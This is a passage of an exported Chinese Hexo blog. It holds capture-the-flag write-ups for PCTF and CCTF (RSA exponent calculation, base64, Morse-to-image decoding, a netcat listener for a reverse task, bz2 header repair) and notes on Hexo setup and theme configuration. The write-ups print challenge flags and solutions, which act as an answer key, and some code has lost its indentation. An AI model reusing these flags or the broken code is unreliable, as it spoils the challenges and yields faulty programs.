</p><p>请提交PCTF{d}</p><p>首先了解一下可以了解一下RSA<a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html"></a></p><p>有 p,q,d 那么求e那简单多了。</p><p>0x01 首先给我自己的做法。我比较傻用的暴力的方法   </p><p>````</p><p>p = int(raw_input(“Enter a p: “))<br>q = int(raw_input(“Enter a q: “))<br>e = int(raw_input(“Enter a e: “))<br>t = (p-1)*(q-1)   </p><p>i=0<br>while True :<br>    if (1-t<em>i)%e == 0:<br>        break<br>    i-=1<br>    print i<br>print ‘ok:’ + ‘%d’ % ((1-t</em>i)/e)  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">**这个代码我优化过了  </span><br><span class="line">原理呢就是因为e与t互质，而 DE mod &#x3D;1.**</span><br><span class="line"></span><br><span class="line">0x02   </span><br><span class="line">**而通过这几天的接触，再一次发现python好用。**</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><blockquote><blockquote><p>import gmpy2<br>p = 3487583947589437589237958723892346254777<br>q = 8767867843568934765983476584376578389<br>e = 65537<br>gmpy2.invert(e,(p-1)*(q-1))  </p></blockquote></blockquote></blockquote><p>mpz(19178568796155560423675975774142829153827883709027717723363077606260717434369L)  </p><blockquote><blockquote><blockquote></blockquote></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">## 神秘文件</span><br><span class="line">**我不知道这什么玩意儿~~</span><br><span class="line">然后呢用winhex看了一下什么都没发现  </span><br><span class="line">好吧我在用kali的file命令看看他到底是什么鬼**。![]()</span><br><span class="line"></span><br><span class="line">OK 知道他是一个磁盘文件了...但是怎么利用...靠我不会阿~~~  </span><br><span class="line">这个时候我又学到了一个技能 mount挂载一下咯...</span><br><span class="line">![]()</span><br><span class="line">打开是好几个TXT文本</span><br><span class="line">![]()</span><br><span class="line">我本来是一个一个去打开复制黏贴的。后来放弃了...太麻烦了 尝试的用python写了个代码</span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line">content &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0,254):</span><br><span class="line">with open (&#39;&#x2F;root&#x2F;Desktop&#x2F;CTF&#x2F;a&#x2F;%d&#39; % i) as txt:</span><br><span class="line">content +&#x3D; txt.read()</span><br><span class="line"></span><br><span class="line">print content</span><br></pre></td></tr></table></figure><h2 id="公倍数"><a href="#公倍数" class="headerlink" title="公倍数"></a>公倍数</h2><p><strong>请计算1000000000以内3或5的倍数之和。<br>如：10以为这样的数有3,5,6,9，和是23<br>请提交PCTF{你的答案}</strong></p><p>编程题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">突然懒得贴了</span><br></pre></td></tr></table></figure><h2 id="Easy-Crackme"><a href="#Easy-Crackme" class="headerlink" title="Easy Crackme"></a>Easy Crackme</h2><p>很明显的一题逆向题。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>酱油之旅--CCTF</title>
      <link href="2015-CCTF-Writeup.html"/>
      <url>2015-CCTF-Writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Base-安码"><a href="#Base-安码" class="headerlink" title="Base 安码"></a>Base 安码</h2><h3 id="MIsc"><a href="#MIsc" class="headerlink" title="MIsc"></a>MIsc</h3><h4 id="misc100-1"><a href="#misc100-1" class="headerlink" title="misc100_1"></a>misc100_1</h4><p>后面将附上打包好的文件  </p><p>用winhex打开图片发现奇怪的代码</p><p>Y3Rme3dlMWMwbWUgdDAgYW5tYWN0ZiF9 </p><p>Base64解密即得flag<br>###misc100_2</p><p>这是一题流量包分析  还好数据不大可以取巧<br>想到当初在某篇writeup看到神奇的命令 strings  </p><p>解码就得到了flag  </p><p>![](<a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cctf_misc100">https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cctf_misc100</a> 2.jpg)</p><p>##Reverse</p><h4 id="Reverse-100T1"><a href="#Reverse-100T1" class="headerlink" title="Reverse_100T1"></a>Reverse_100T1</h4><p>这个很简单 其实打开就看到了flag，问题脑洞大我以为这是md5加密并没有直接提交  谁知道….  </p><h4 id="Reverse-100T2"><a href="#Reverse-100T2" class="headerlink" title="Reverse_100T2"></a>Reverse_100T2</h4><p>这题让我知道有时候是需要监听的  还有第一次使用IL spy好紧张  </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cctf_R2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cctf_R2.png"></a></p><p>需要监听 本地 31337端口<br>nc -l -p 31337  </p><p>然后你就看到flag  CTF{7eb67b0bb4427e0b43b40b6042670b55}  </p><h4 id="Reverse-100T3"><a href="#Reverse-100T3" class="headerlink" title="Reverse_100T3"></a>Reverse_100T3</h4><p>这题告诉我要静下心来  看看是不是有算法</p><p>然后直接上龙哥的图了 龙哥的注释杠杠的  </p><p>这里需要字符串拼接 拼接结果是 4 2 3 1  </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/CCTF_RE3.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/CCTF_RE3.png"></a></p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>##Best_Easy_Misc</p><p>我不服！！！为什么他们都能直接解压缩而我不行呢<br>不知为什么我解压不出来 但是右键属性看到了加密 于是我去百度了一下伪加密，发现可以用手机解压。。。。我还是不服<del>~</del></p><p>解压出来是一个txt文件<br>打开一串的-.-.-<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/Bsst.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/Bsst.jpg"></a><br>如图  </p><p>这时候怎么办 刚开始觉得有点像莫尔斯密码 然后又和马师傅一起说出了培根…其实都无所谓的…<br>解法1<br>   把”-“ 换成1 把”.”换成0  仔细看了看发现是1024个字符，刚好是32的次方，于是排列成排一个方格，然后就看了flag  </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cctf_best1.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cctf_best1.jpg"></a></p><p> 解法2<br>​     用脚本跑吧<br>   这是我从别人那copy过来的..</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="comment">#author:pcat</span></span><br><span class="line"><span class="comment">#必须先安装Image模块</span></span><br><span class="line">import Image</span><br><span class="line"></span><br><span class="line">dct=&#123;</span><br><span class="line"><span class="string">&#x27;A&#x27;</span>:<span class="string">&#x27;.-&#x27;</span>,<span class="string">&#x27;B&#x27;</span>:<span class="string">&#x27;-...&#x27;</span>,<span class="string">&#x27;C&#x27;</span>:<span class="string">&#x27;-.-.&#x27;</span>,<span class="string">&#x27;D&#x27;</span>:<span class="string">&#x27;-..&#x27;</span>,<span class="string">&#x27;E&#x27;</span>:<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;F&#x27;</span>:<span class="string">&#x27;..-.&#x27;</span>,<span class="string">&#x27;G&#x27;</span>:<span class="string">&#x27;--.&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;H&#x27;</span>:<span class="string">&#x27;....&#x27;</span>,<span class="string">&#x27;I&#x27;</span>:<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;J&#x27;</span>:<span class="string">&#x27;.---&#x27;</span>,<span class="string">&#x27;K&#x27;</span>:<span class="string">&#x27;-.-&#x27;</span>,<span class="string">&#x27;L&#x27;</span>:<span class="string">&#x27;.-..&#x27;</span>,<span class="string">&#x27;M&#x27;</span>:<span class="string">&#x27;--&#x27;</span>,<span class="string">&#x27;N&#x27;</span>:<span class="string">&#x27;-.&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;O&#x27;</span>:<span class="string">&#x27;---&#x27;</span>,<span class="string">&#x27;P&#x27;</span>:<span class="string">&#x27;.--.&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>:<span class="string">&#x27;--.-&#x27;</span>,<span class="string">&#x27;R&#x27;</span>:<span class="string">&#x27;.-.&#x27;</span>,<span class="string">&#x27;S&#x27;</span>:<span class="string">&#x27;...&#x27;</span>,<span class="string">&#x27;T&#x27;</span>:<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;U&#x27;</span>:<span class="string">&#x27;..-&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;V&#x27;</span>:<span class="string">&#x27;...-&#x27;</span>,<span class="string">&#x27;W&#x27;</span>:<span class="string">&#x27;.--&#x27;</span>,<span class="string">&#x27;X&#x27;</span>:<span class="string">&#x27;-..-&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>:<span class="string">&#x27;-.--&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>:<span class="string">&#x27;--..&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;0&#x27;</span>:<span class="string">&#x27;-----&#x27;</span>,<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;.----&#x27;</span>,<span class="string">&#x27;2&#x27;</span>:<span class="string">&#x27;..---&#x27;</span>,<span class="string">&#x27;3&#x27;</span>:<span class="string">&#x27;...--&#x27;</span>,<span class="string">&#x27;4&#x27;</span>:<span class="string">&#x27;....-&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;5&#x27;</span>:<span class="string">&#x27;.....&#x27;</span>,<span class="string">&#x27;6&#x27;</span>:<span class="string">&#x27;-....&#x27;</span>,<span class="string">&#x27;7&#x27;</span>:<span class="string">&#x27;--...&#x27;</span>,<span class="string">&#x27;8&#x27;</span>:<span class="string">&#x27;---..&#x27;</span>,<span class="string">&#x27;9&#x27;</span>:<span class="string">&#x27;----.&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;.&#x27;</span>:<span class="string">&#x27;.-.-.-&#x27;</span>,<span class="string">&#x27;:&#x27;</span>:<span class="string">&#x27;---...&#x27;</span>,<span class="string">&#x27;,&#x27;</span>:<span class="string">&#x27;--..--&#x27;</span>,<span class="string">&#x27;;&#x27;</span>:<span class="string">&#x27;-.-.-.&#x27;</span>,<span class="string">&#x27;?&#x27;</span>:<span class="string">&#x27;..--..&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;=&#x27;</span>:<span class="string">&#x27;-...-&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>:<span class="string">&#x27;.----.&#x27;</span>,<span class="string">&#x27;/&#x27;</span>:<span class="string">&#x27;-..-.&#x27;</span>,<span class="string">&#x27;!&#x27;</span>:<span class="string">&#x27;-.-.--&#x27;</span>,<span class="string">&#x27;-&#x27;</span>:<span class="string">&#x27;-....-&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;_&#x27;</span>:<span class="string">&#x27;..--.-&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>:<span class="string">&#x27;.-..-.&#x27;</span>,<span class="string">&#x27;(&#x27;</span>:<span class="string">&#x27;-.--.&#x27;</span>,<span class="string">&#x27;)&#x27;</span>:<span class="string">&#x27;-.--.-&#x27;</span>,<span class="string">&#x27;$&#x27;</span>:<span class="string">&#x27;...-..-&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;&amp;&#x27;</span>:<span class="string">&#x27;.-...&#x27;</span>,<span class="string">&#x27;@&#x27;</span>:<span class="string">&#x27;.--.-.&#x27;</span>,<span class="string">&#x27;+&#x27;</span>:<span class="string">&#x27;.-.-.&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def readRe():</span><br><span class="line">f=open(<span class="string">&#x27;reverse&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).<span class="built_in">read</span>().strip()</span><br><span class="line">lst=f.split(<span class="string">&#x27;  &#x27;</span>)</span><br><span class="line"><span class="comment">#键值交换</span></span><br><span class="line">dct2=&#123;v:k <span class="keyword">for</span> k,v <span class="keyword">in</span> dct.items()&#125;</span><br><span class="line"><span class="comment">#摩斯密码解密</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(lst)):</span><br><span class="line">lst[i]=dct2[lst[i]]</span><br><span class="line"><span class="built_in">return</span> <span class="string">&quot;&quot;</span>.join(lst)</span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line"><span class="comment">#读取reverse文件</span></span><br><span class="line">s=readRe()</span><br><span class="line"><span class="comment">#绘制图</span></span><br><span class="line">n=32</span><br><span class="line">width,height=n,n</span><br><span class="line">bgcolor=(255,255,255)</span><br><span class="line">im= Image.new(<span class="string">&#x27;RGB&#x27;</span>,(width,height),bgcolor)</span><br><span class="line">pix=im.load()</span><br><span class="line">i=0</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(0,height):</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> xrange(0,width):</span><br><span class="line"><span class="keyword">if</span> s[i]==<span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">pix[x,y]=(0,0,0)</span><br><span class="line">i+=1</span><br><span class="line"><span class="comment">#图像旋转180度</span></span><br><span class="line">out=im.rotate(180)</span><br><span class="line">out.show()</span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">foo()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;ok&#x27;</span></span><br></pre></td></tr></table></figure><p>接着据生成了我要的falg </p><h3 id="True-or-False"><a href="#True-or-False" class="headerlink" title="True or False?"></a>True or False?</h3><p>  这题马师傅吓死我了 居然过来问我有没有思路 受宠若惊 受宠若惊   </p><p>hint说了他是一个压缩文件 然而尝试了各种压缩果断放弃…<br>  之后又放出hint Bz2 果断百度豁然开朗<del>~</del><br>  然后又傻逼了一回，没有加文件头难怪死活解压不出来<br>  用winhex打开  </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cctf_true-or-false-bin.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cctf_true-or-false-bin.jpg"></a></p><p> 百度一下BZ2压缩文件的文件头加上  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar   -jxvf    aaaa.tar.bz2</span><br></pre></td></tr></table></figure><p> 命令解压缩…<br> 得到两个Bin文件   </p><p> 稍微逆向看一下<br> 因为IDA不是很熟悉  在这里我学习到了IDA不仅仅有F5这个功能还有R键….这里上龙师傅的图</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/true-or-false2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/true-or-false2.png"></a></p><p> OK 按顺序拼接就得到falg了</p><hr><p>然后酱油就打到这里了~</p><p>酱油党要睡觉了…</p><p>明天看完WP有想法再来更新….</p><p><a href="http://7xt21h.com2.z0.glb.clouddn.com/CCTF.zip">文件</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 使用</title>
      <link href="Hexo-Use.html"/>
      <url>Hexo-Use.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">文章开头：</span><br><span class="line">tile: name</span><br><span class="line">date: 2016-04-14 00:26:19</span><br><span class="line">description: <span class="comment">#描述</span></span><br><span class="line">categories: <span class="comment">#分类</span></span><br><span class="line">tags: <span class="comment">#标签</span></span><br><span class="line">- 博客</span><br><span class="line">- hexo</span><br><span class="line">toc: <span class="literal">true</span> <span class="comment">#生成目录</span></span><br><span class="line">author: </span><br><span class="line">comments:</span><br><span class="line">original:</span><br><span class="line">permalink: <span class="comment"># 指定链接</span></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">   以上为摘要</span><br><span class="line"> &lt;!--more--&gt;</span><br><span class="line">    </span><br><span class="line">       正文</span><br><span class="line">      </span><br></pre></td></tr></table></figure><h2 id="文章图片路径"><a href="#文章图片路径" class="headerlink" title="文章图片路径"></a>文章图片路径</h2><p> Hexo如何方式图片，图片应该放置到哪里，不会应为上传而覆盖掉。然后把文章里的index.md删除，将文件存放在resource文件夹中间。  </p><figure class="highlight plain"><figcaption><span>bash</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">发布页面</span><br><span class="line">$ hexo new page &quot;name&quot;</span><br><span class="line"></span><br><span class="line">    uuhike@uuhike-pc mingw64 &#x2F;d&#x2F;hexo (master)</span><br><span class="line">$ hexo new page &quot;resoures&quot;</span><br><span class="line">   INFO Creatd: D:\Hexo\Hexo\source\resoures\index.md</span><br></pre></td></tr></table></figure><p>参考资料：<br>   <a href="http://luuman.github.io/2015/12/25/Hexo/#u6587_u7AE0_u56FE_u7247_u8DEF_u5F84">使用HEXO</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 主题：SPFK</title>
      <link href="Hexo-Theme.html"/>
      <url>Hexo-Theme.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>　　** Hexo 主题：**用了yilia主题一段时间，感觉还有很多可以提高的地方，就查阅资料，对其进行粗类的修改，<br>但是，有其实还有很多不完善的地方，欢迎大家前捧场。没想到，这么多人喜欢黑色版本的，建议不是每个人都喜欢我的这些功能，所以准备个基础版本，插件可以看教程自行安装。</p><a id="more"></a><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;luuman&#x2F;hexo-theme-spfk.git themes&#x2F;spfk</span><br></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>修改hexo根目录下的 <code>_config.yml</code> ： <code>theme: spfk</code></p><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd themes&#x2F;spfk</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure><h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><p>关于配置文件，</p><p>主题配置文件在主目录下的<code>_config.yml</code>：<a href="http://luuman.github.io/2015/12/21/GitHub+Hexo/" title="主题配置文件">_config.yml</a></p><p>相关插件的安装：请参照<a href="http://localhost:4000/2015/12/27/Hexo-plug/" title="请参照安装">Hexo插件安装</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">### Header</span><br><span class="line">J:\Hexo\Hexo\themes\spfk\_config.yml</span><br><span class="line">menu:</span><br><span class="line">  主页: &#x2F;</span><br><span class="line">  所有文章: &#x2F;archives</span><br><span class="line">  # 随笔: &#x2F;tags&#x2F;随笔</span><br><span class="line"></span><br><span class="line">    #是否开启多说评论，填写你在多说申请的项目名称 duoshuo: duoshuo-key（http:&#x2F;&#x2F;duoshuo-key.duoshuo.com&#x2F;）</span><br><span class="line">    #若使用disqus，请在博客config文件中填写disqus_shortname，并关闭多说评论</span><br><span class="line">    duoshuo: true</span><br><span class="line"></span><br><span class="line">网页侧边栏背景:</span><br><span class="line"></span><br><span class="line"># Background | 背景</span><br><span class="line">## &quot;background_sum&quot;: show images form &#x2F;source&#x2F;background&#x2F;的图片数目background_sum: 24</span><br><span class="line">## &quot;on: true&quot;: 自动随机显示这5张图片</span><br><span class="line">## &quot;on: false&quot;: 自定义显示图片设置，background_image: 109</span><br><span class="line">background:</span><br><span class="line">  on: true</span><br><span class="line">  #on: false</span><br><span class="line">  background_sum: 24</span><br><span class="line">  background_image: 109</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="多说评论"><a href="#多说评论" class="headerlink" title="多说评论"></a>多说评论</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">duoshuo: </span><br><span class="line">  on: true</span><br><span class="line">  domain: luuman</span><br><span class="line">  # 是否开启多说评论，http:&#x2F;&#x2F;duoshuo.com&#x2F;create-site&#x2F;</span><br><span class="line">  # 使用上面网址登陆你的多说，然后创建站点，在 domain 中填入你设定的域名前半部分</span><br><span class="line">  # http:&#x2F;&#x2F;&lt;要填的部分&gt;.duoshuo.com (domain只填上&lt;&gt;里的内容，不要填整个网址)</span><br><span class="line"></span><br><span class="line">J:\Hexo\Hexo\themes\spfk\source\css\多说.css</span><br><span class="line"></span><br><span class="line">添加方法：</span><br><span class="line">添加方法：打开「后台」 &gt; 「多说评论」 &gt; 「设置」 &gt; 「基本设置」 &gt; 然后把样式粘贴到「自定义CSS」文本框 &gt; 「保存」</span><br><span class="line"></span><br><span class="line">具体样式请参照：[多说.css](https:&#x2F;&#x2F;github.com&#x2F;luuman&#x2F;Hexo&#x2F;blob&#x2F;master&#x2F;themes&#x2F;spfk&#x2F;source&#x2F;css&#x2F;%E5%A4%9A%E8%AF%B4.css &quot;CSS样式集合&quot;)</span><br></pre></td></tr></table></figure><h3 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">头像尺寸大概200*200px</span><br><span class="line">E:\Github\Hexo\themes\spfk\source\img\head.jpg</span><br></pre></td></tr></table></figure><h3 id="Apple-Touch-icon-苹果图标"><a href="#Apple-Touch-icon-苹果图标" class="headerlink" title="Apple Touch icon 苹果图标:"></a>Apple Touch icon 苹果图标:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">替换路径: &#x2F;spfk&#x2F;source&#x2F;apple-touch-icon.png</span><br><span class="line"></span><br><span class="line">E:\Github\Hexo\themes\spfk\source\img\favicon.png</span><br></pre></td></tr></table></figure><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Background | 背景</span><br><span class="line">## &quot;background_sum&quot;: show images form &#x2F;source&#x2F;background&#x2F;的图片数目</span><br><span class="line">## &quot;on: true&quot;: 自动随机显示这5张图片</span><br><span class="line">## &quot;on: false&quot;: 自定义显示图片设置 background_image: 5</span><br><span class="line">background:</span><br><span class="line">  on: true</span><br><span class="line">  #on: false</span><br><span class="line">  background_sum: 24</span><br><span class="line">  background_image: 109</span><br></pre></td></tr></table></figure><h3 id="文章摘要"><a href="#文章摘要" class="headerlink" title="文章摘要"></a>文章摘要</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">title: 前端知识体系</span><br><span class="line">date: 2016-01-16 13:58:41</span><br><span class="line">description: </span><br><span class="line">categories:</span><br><span class="line">- HTML 书籍</span><br><span class="line">- HTML 书籍</span><br><span class="line">tags:</span><br><span class="line">- HTML 标签 </span><br><span class="line">- HTML 标签</span><br><span class="line">toc: true 文章目录</span><br><span class="line">author:</span><br><span class="line">comments:</span><br><span class="line">original:</span><br><span class="line">permalink: </span><br><span class="line">---</span><br><span class="line">　　** 前端知识体系：**&lt;Excerpt in index | 首页摘要&gt; </span><br><span class="line"></span><br><span class="line">+ &lt;!-- more --&gt;</span><br><span class="line">&lt;The rest of contents | 余下全文&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="404-Page"><a href="#404-Page" class="headerlink" title="404 Page:"></a>404 Page:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo new page 404</span><br><span class="line">And then set permalink: &#x2F;404 in &#x2F;source&#x2F;404&#x2F;index.md front matter.</span><br><span class="line">在 Hexo 中创建匹配主题的404页面</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="主题结构："><a href="#主题结构：" class="headerlink" title="主题结构："></a>主题结构：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 